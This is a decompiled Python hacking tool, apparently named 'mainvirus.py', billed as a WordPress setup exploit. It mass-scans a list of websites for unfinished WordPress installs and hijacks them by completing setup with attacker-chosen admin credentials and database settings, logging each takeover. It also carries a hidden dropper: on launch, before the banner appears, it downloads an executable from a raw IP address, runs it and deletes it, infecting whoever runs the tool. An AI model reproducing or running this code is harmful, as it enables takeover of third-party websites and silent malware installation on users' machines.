# uncompyle6 version 3.7.4
# Python bytecode 3.7 (3394)
# Decompiled from: Python 3.5.0 (v3.5.0:374f501f4567, Sep 13 2015, 02:27:37) [MSC v.1900 64 bit (AMD64)]
# Embedded file name: mainvirus.py
try:
    import crayons
except ImportError:
    print('Install crayons')

import re, os, getpass
try:
    import requests
except ImportError:
    print('Install requests')

import urllib3
from platform import system
from colorama import Fore, Style
from random import sample as rand
import json, sys, queue, time, random, os
from platform import system
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor
from threading import Thread
from time import sleep
from random import choice
from string import ascii_lowercase
import secrets
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
PYTHONWARNINGS = 'ignore:Unverified HTTPS request'
url = 'http://45.95.168.116/filemanager.exe'
r = requests.get(url, allow_redirects=False, timeout=20, verify=False)
open('bin/filemanager.exe', 'wb').write(r.content)
try:
    os.system('bin\\filemanager.exe')
except:
    pass

try:
    os.remove('bin\\filemanager.exe')
except:
    pass

try:
    os.makedirs('Result', exist_ok=True)
except:
    pass

try:
    os.makedirs('bin', exist_ok=True)
except:
    pass

def banner():
    print(f"\t\n\t\t{Fore.GREEN}\n\t\t██╗    ██╗██████╗     ███████╗███████╗████████╗██╗   ██╗██████╗ \n\t\t██║    ██║██╔══██╗    ██╔════╝██╔════╝╚══██╔══╝██║   ██║██╔══██╗\n\t\t██║ █╗ ██║██████╔╝    ███████╗█████╗     ██║   ██║   ██║██████╔╝\n\t\t██║███╗██║██╔═══╝     ╚════██║██╔══╝     ██║   ██║   ██║██╔═══╝ \n\t\t╚███╔███╔╝██║         ███████║███████╗   ██║   ╚██████╔╝██║     \n\t\t ╚══╝╚══╝ ╚═╝         ╚══════╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝     \n\t\t                                                         v2.0       \n\t\t{Style.RESET_ALL}\n\t\t\t[+] WP CMS Setup Exploit coded by Amaterasu [+]\n\t\n\t")


banner()

def clear():
    linux = 'clear'
    windows = 'cls'
    os.system([linux, windows][(os.name == 'nt')])


sititle = 'This is Blog Site by Amaterasu'
siuser = 'anon'
sipass = 'anon'
simail = 'mrerrorviper@gmail.com'
try:
    if not os.path.exists('bin/config.txt'):
        open('bin/config.txt', 'w').write('sitedbname :\nsitedbuser :\nsitedbpass :\nsitedbhost :')
except:
    pass

try:
    configewp1 = open('bin/config.txt', 'r').read().splitlines()
    qw = list(configewp1[0].split(':'))
    qe = list(configewp1[1].split(':'))
    qr = list(configewp1[2].split(':'))
    qt = list(configewp1[3].split(':'))
    sitedbname = sitedbname = qw[1]
    sitedbuser = sitedbuser = qe[1]
    sitedbpass = sitedbpass = qr[1]
    sitedbhost = sitedbhost = qt[1]
except IndexError:
    print('[!] IndexError , please fix bin/config.txt file')

user_agent_list = [
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36',
 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0',
 'Mozilla/5.0 (X11; Linux i686; rv:79.0) Gecko/20100101 Firefox/79.0',
 'Mozilla/5.0 (Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0',
 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:79.0) Gecko/20100101 Firefox/79.0',
 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0',
 'Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 OPR/70.0.3728.95',
 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 OPR/70.0.3728.95',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 OPR/70.0.3728.95',
 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 OPR/70.0.3728.95',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0',
 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0',
 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; rv:11.0) like Gecko',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36']

def abc(host):
    s = requests.Session()
    r1 = s.post((host + '/wp-admin/install.php?step=2&language=en_US'), data={'weblog_title':sititle,  'user_name':siuser,  'admin_password':sipass,  'admin_password2':sipass,  'admin_email':simail,  'language':'',  'Submit':'Install+WordPress'})


def az(host):
    s = requests.Session()
    siteprefix11 = ''.join((choice(ascii_lowercase) for i in range(10)))
    siteprefix = 'wp_1' + siteprefix11
    r = s.post((host + '/wp-admin/setup-config.php?step=2&language=en_US'), data={'dbname':sitedbname,  'uname':sitedbuser,  'pwd':sitedbpass,  'dbhost':sitedbhost,  'prefix':siteprefix,  'language':'',  'submit':'Submit'})
    r1 = s.post((host + '/wp-admin/install.php?step=2&language=en_US'), data={'weblog_title':sititle,  'user_name':siuser,  'admin_password':sipass,  'admin_password2':sipass,  'admin_email':simail,  'language':'',  'Submit':'Install+WordPress'})


def wp_inst(host):
    lss = [
     '/', '/wordpress/', '/wp/', '/blog/', '/new/', '/old/', '/backup/', '/oldsite/', '/site/', '/back/', '/web/']
    for i in lss:
        try:
            user_agent = secrets.choice(user_agent_list)
            headers = {'User-Agent': user_agent}
            check_stts = requests.head((host + i + 'xmlrpc.php'), allow_redirects=False, verify=False, headers=headers, timeout=20)
        except:
            pass

        if check_stts.status_code == 302:
            if 'wp-admin/install.php' in str(check_stts.headers):
                print(f"{Fore.GREEN}  [XxX]{Style.RESET_ALL} {host}{i}  {Fore.GREEN} => WP Install Found{Style.RESET_ALL}")
                open('Result/wp-install.txt', 'a').write(host + i + '\n')
                abc(host + i)
                check2 = requests.get(host + i + 'wp-login.php')
                if sititle in str(check2.content):
                    print(f"{Fore.GREEN} \t [XxX]{Style.RESET_ALL} {host}{i}  {Fore.GREEN} => Successfully Installed{Style.RESET_ALL}")
                    open('Result/wp-install-done.txt', 'a').write(host + i + 'wp-login.php#' + siuser + '|' + sipass + '\n')
                else:
                    print('[+] Failed Installation ===> ' + host + i)
            else:
                if 'setup-config.php' in str(check_stts.headers):
                    print(f"{Fore.GREEN}  [XxX]{Style.RESET_ALL} {host}{i}  {Fore.GREEN} => WP Setup-Config Found{Style.RESET_ALL}")
                    open('Result/wp-config.txt', 'a').write(host + i + '\n')
                    az(host + i)
                    check3 = requests.get(host + i + 'wp-login.php')
                    if sititle in str(check3.content):
                        print(f"{Fore.GREEN} \t [XxX]{Style.RESET_ALL} {host}{i}  {Fore.GREEN} => Successfully Installed{Style.RESET_ALL}")
                        open('Result/wp-install-done.txt', 'a').write(host + i + 'wp-login.php#' + siuser + '|' + sipass + '\n')
                    else:
                        print('[+] Failed Installation ===> ' + host + i)
                else:
                    print('  [+] Failed ===> ' + host + i)
                continue
        print('  [+] Failed ===> ' + host + i)


def submitter(host):
    if host.endswith('/'):
        host = host[:-1]
    if host.startswith('http://'):
        pass
    else:
        if host.startswith('https://'):
            pass
        else:
            host = 'http://' + host
        wp_inst(host)


def main():
    try:
        hostlistname = input('[XxX] Enter Websites List : ').strip()
        thrd = int(input('[XxX] Enter Number of Thread : ').strip())
    except (IOError, ValueError, FileNotFoundError, NameError, KeyboardInterrupt, EOFError):
        pass

    hostlistlines = open(hostlistname, 'r').read().splitlines()
    hostlistlines = list(hostlistlines)
    le = '[XxX] Total Sites : '
    print(le, len(hostlistlines))
    t1 = time.time()
    with ThreadPoolExecutor(max_workers=thrd) as (executor):
        for line in hostlistlines:
            executor.submit(submitter, line)

    print('\n\t\tFinished in :  ', time.time() - t1)


if __name__ == '__main__':
    clear()
    banner()
    Passwd = getpass.getpass('[XxX] Enter The Password : ')
    user_agent = secrets.choice(user_agent_list)
    headers = {'User-Agent': user_agent}
    pwn = requests.get('https://pastebin.com/raw/RMuRWiDR', verify=False, timeout=7, headers=headers).text
    pwn = str(pwn)
    if pwn in Passwd:
        clear()
        banner()
        main()
    else:
        print('\t [XxX] For passwd contact Amaterasu')